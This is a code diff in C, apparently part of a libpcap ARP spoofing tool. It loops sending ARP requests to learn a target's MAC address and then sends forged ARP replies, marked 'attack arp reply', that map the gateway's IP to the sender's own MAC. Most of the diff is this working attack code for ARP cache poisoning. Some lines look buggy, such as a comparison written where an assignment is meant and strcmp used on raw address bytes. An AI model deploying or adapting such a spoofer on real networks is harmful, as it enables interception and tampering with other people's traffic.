@@ -137,19 +137,13 @@
 	memcpy((*arprequest_arp).spa,my_ip,4);		//senderip-my, i have to get my ip information
 	inet_pton(AF_INET,target_ip,(*arprequest_arp).tpa); //targetip
 
-	/* attack arp reply */
-////	(*arpreply_eth).ether_dhost={target mac};
-	memcpy((*arpreply_eth).ether_shost,my_mac,6); 	//my mac
-	memcpy((*arpreply_arp).sha,my_mac,6);		//my mac
-	inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa); //sender ip - gateway
-////	(*arpreply_arp).tha={target mac};		
-	inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa); //targetip
+
 
 				
 
 			
 	
-	unsigned char target_mac[6];
+	unsigned char target_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
 
         /* Define the device */
         dev = pcap_lookupdev(errbuf);
@@ -181,37 +175,51 @@
 
   	  while(1)
 	  {
-	      	int res;
-		 /* Grab a packet */
-      		res=pcap_next_ex(handle, &header,&packet);
-      	        if(res==0) continue;
-		else if(res==-1) break;
-		else if(res==-2) break;
-		/* Print its length */
-
-		ethernet=(struct sniff_ethernet*)packet;
-
-		if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
-	{
-		arp_to_know_targetmac==(struct arphdr*)(packet+14);
-		if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
-		{
-			if(!strcmp((*arp_to_know_targetmac).spa,target_ip_data))
-			{
-				memcpy(target_mac,(*arp_to_know_targetmac).sha,6);
-			}
-		}
-	}	
-
-
-
-	      	printf("%s\n",sender_ip);
+		printf("%s\n",sender_ip);
 		printf("%s\n",target_ip);
 
 		if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
 		{
 			printf("error\n");
 		}
+
+	      	int res;
+		 /* Grab a packet */
+      		res=pcap_next_ex(handle, &header,&packet);
+      	        if(res==0) continue;
+		else if(res==-1) break;
+		else if(res==-2) break;
+	
+
+		ethernet=(struct sniff_ethernet*)packet;
+
+		if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
+		{
+			arp_to_know_targetmac==(struct arphdr*)(packet+14);
+			if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
+			{
+				if(!strcmp((*arp_to_know_targetmac).spa,target_ip_data))
+				{
+					memcpy(target_mac,(*arp_to_know_targetmac).sha,6);
+				}
+			}
+		}	
+
+	/* attack arp reply */
+	memcpy((*arpreply_eth).ether_dhost,target_mac,6);
+	memcpy((*arpreply_eth).ether_shost,my_mac,6); 	//my mac
+	memcpy((*arpreply_arp).sha,my_mac,6);		//my mac
+	inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa); //sender ip - gateway
+	memcpy((*arpreply_arp).tha,target_mac,6);		
+	inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa); //targetip
+
+		if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
+		{
+			printf("error\n");
+		}
+
+
+
 	  }
 
         pcap_close(handle);
